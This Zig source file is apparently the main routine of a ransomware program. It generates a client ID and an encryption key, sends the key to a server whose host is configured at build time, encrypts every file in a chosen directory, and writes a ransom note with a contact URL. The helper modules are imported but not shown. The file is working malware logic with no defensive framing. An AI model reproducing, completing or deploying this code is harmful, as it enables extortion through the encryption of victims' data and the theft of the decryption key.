const build_options = @import("build_options");
const std = @import("std");
const cipher = @import("./core/cipher.zig");
const Level = @import("./core/level.zig").Level;
const Mode = @import("./core/mode.zig").Mode;
const randomBytes = @import("./core/util.zig").randomBytes;
const randomNumbers = @import("./core/util.zig").randomNumbers;
const sendKeyToServer = @import("./core/net.zig").sendKeyToServer;
const makeRansomNote = @import("./core/note.zig").makeRansomNote;
const run = @import("./core/run.zig").run;

// Build options
const OPTION_DIR: []const u8 = build_options.dir;
const OPTION_SERVER_HOST: []const u8 = build_options.server_host;
const OPTION_SERVER_PORT: u16 = build_options.server_port;
const OPTION_SERVER_PATH: []const u8 = build_options.server_path;
const OPTION_CONTACT_URL: []const u8 = build_options.contact_url;
const OPTION_LEVEL: usize = build_options.level;

pub fn main() !void {
    const level = try Level.init(OPTION_LEVEL);

    // Create a client ID
    const id = try randomNumbers();
    // Generate an encryption key.
    const key = try randomBytes(cipher.xchacha20_poly1305.getKeySize());
    // Send the key to the server.
    try sendKeyToServer(
        OPTION_SERVER_HOST,
        OPTION_SERVER_PORT,
        OPTION_SERVER_PATH,
        id,
        key,
    );

    var dir = try std.fs.cwd().openDir(OPTION_DIR, .{ .iterate = true });
    defer dir.close();
    try run(Mode.encrypt, level, key, &dir, OPTION_DIR);

    try makeRansomNote(OPTION_DIR, OPTION_CONTACT_URL, id);
}
